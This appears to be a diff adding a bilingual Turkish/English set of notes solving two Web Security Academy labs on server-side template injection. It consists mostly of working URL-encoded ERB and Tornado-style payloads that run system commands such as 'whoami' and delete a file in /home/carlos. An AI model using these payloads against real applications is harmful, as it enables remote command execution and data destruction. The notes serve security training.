@@ -1,0 +1,28 @@
+              Server-side template injection
+              Sunucu tarafı şablon enjeksiyonu
+
+####################################################
+#      Basic server-side template injection        #
+#      Temel sunucu tarafı şablon enjeksiyonu      #
+####################################################
+
+1--> Açığın tespiti için payload deniyoruz => <%= 7*7 %> 
+https://$YOURLABSID.web-security-academy.net/?message=Unfortunately%20this%20product%20is%20out%20of%20stock 
+https://$YOURLABSID.web-security-academy.net/?message=%3C%=%207*7%20%%3E => payload inject ediyoruz ve sonuç dönmesini izliyoruz
+https://$YOURLABSID.web-security-academy.net/?message=%3C%25%3d+7*7+%25%3E => başka bir matematiksel payload
+https://$YOURLABSID.web-security-academy.net/?message=%3C%=%20system(%22whoami%22)%20%%3E => kullanıcıyı öğrendik
+https://$YOURLABSID.web-security-academy.net/?message=%3C%=%20system(%22rm%20/home/carlos/morale.txt%22)%20%%3E => kullanıcının içerisindeki txt dosyasını sildik. (Hacktricks ssti ERB (Ruby) kaynakları)
+
+###################################################################
+#      Basic server-side template injection (code context)        #
+#      Temel sunucu tarafı şablon enjeksiyonu (kod bağlamı)       #
+###################################################################
+
+2--> 
+blog-post-author-display=user.name}}{{7*7}} => payload yükledik
+Peter Wiener49}} olarak yorumdaki kullanıcı adını güncelledi ve ssti var
+aşağıdaki kodları inject ettik burpsuite ile
+{% import os %}
+{{os.system('rm /home/carlos/morale.txt')
+blog-post-author-display=user.nickname}}{%25+import+os+%25}{{os.system('rm%20/home/carlos/morale.txt') => txt dosyası silindi.
+
